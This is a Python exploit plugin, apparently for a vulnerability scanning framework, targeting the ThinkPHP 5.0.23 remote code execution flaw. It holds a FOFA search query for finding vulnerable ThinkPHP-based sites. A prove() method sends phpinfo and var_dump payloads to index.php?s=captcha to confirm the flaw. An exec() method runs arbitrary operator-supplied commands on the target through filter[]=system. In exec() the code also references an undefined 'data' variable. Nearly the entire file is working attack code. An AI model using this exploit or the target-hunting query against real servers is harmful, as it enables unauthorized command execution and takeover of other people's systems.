#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from urllib import parse
from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    '''
    _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=包含&x=phpinfo();
    fofa :
     "( app=\"ThinkSNS\")||( app=\"eyoucms\")||( app=\"Onethink\")||( app=\"TPshop\")||( body=\"/admin/login/checkverify.html?tm=\" || body=\"snake后台登录\")||( title=\"基于ThinkPHP5和Bootstrap的极速后台开发框架\" || title=\"fastadmin\" || body=\"fastadmin.net\")||( body=\"class=\\\"verifyimg reload-verify\\\"\" && body=\"class=\\\"panel-lite\\\"\" && body=\"lyui\")||( body=\"/public/static/admin/css/dolphin.css\" || body=\"/admin.php/user/publics/signin.html\" || body=\"/public/static/admin/js/dolphin.js\")||( body=\"/public/static/dist/img/logo.png\" || body=\"/Public/Admin/dist/img/logo.png\" || body=\"Powered by WeMall\")||( app=\"layui\")||( body=\"/css/AdminLTE.css\" || body=\"/css/AdminLTE.min.css\")||( body=\"yuan1994\" && body=\"/static/admin/h-ui/css/H-ui.min.css\"&& body=\"href=\\\"/static/admin/h-ui.admin/css/H-ui.login.css\\\"\")||( body=\"/admin/publics/index.html\" && body=\"login-head\")||( body=\"/haoidcn/Admin/Public\")||( body=\"/css/H-ui.min.css\" || body=\"/css/H-ui.login.css\" || body=\"/h-ui.admin/\")||( title=\"Tplay\" || ( body=\"Tplay\" && body=\"layui\"))||( body=\"/public/static/js/qibo.js\" || body=\"qb_ui.css\")||( body=\"/public/static/css/pc_reset.css\" || body=\"/public/static/css/qb_ui.css\")||( body=\"/css/AdminLTE.css\" || body=\"/css/AdminLTE.min.css\")||( body=\"YFCMF\" && body=\"/public/others/maxlength.js\" || body=\"/yfcmf/yfcmf.js\")||( body=\"/home/memberorder/index.html\" || body=\"/home/showjoinin/index.html\")||( body=\"http://www.cltphp.com/\" || body=\"this.src='/user/login/verify.html?'+'id='+Math.random()\")||\"ThinkPHP5\"|| app=\"ThinkPHP\""
    '''
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'thinkphp 5.0.23 getshell'
        self.keyword = ['thinkphp']
        self.info = 'thinkphp 5.0.23 getshell'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            headers ={}
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, 'public/'),
                self.url_normpath(self.url, './'),
                self.url_normpath(self.url, './public/'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    for poc in ['_method=__construct&method=get&filter[]=phpinfo&server[REQUEST_METHOD]=1',
                                '_method=__construct&method=get&filter[]=var_dump&server[REQUEST_METHOD]=this_is_a_test']:
                        url = path + 'index.php?s=captcha'
                        async with session.post(url=url, data=poc, headers=headers) as res:
                            if res != None:
                                text = await res.text()
                                if 'PHP Version' in text or 'string(14) "this_is_a_test"' in text:
                                    self.flag = 1
                                    self.req.append({"flag": url})
                                    self.res.append({"info": url, "key": "thinkphp 5.0.23 getshell"})
                                    break

    async def exec(self):
        await self.get_url()
        if self.base_url:
            headers ={ }
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            poc = '_method=__construct&method=get&filter[]=system&server[REQUEST_METHOD]=%s' %parse.quote_plus(data['cmd'])
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, 'public/'),
                self.url_normpath(self.url, './'),
                self.url_normpath(self.url, './public/'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    for pocpath in ['index.php?s=captcha']:
                        url = path + pocpath
                        async with session.post(url=url, data=poc, headers=headers) as res:
                            if res != None:
                                if res != None and res.status == 500:
                                    text = await res.text()
                                    self.flag = 1
                                    self.req.append({"flag": url})
                                    self.res.append({"info": text, "key": "thinkphp 5.0.23 getshell"})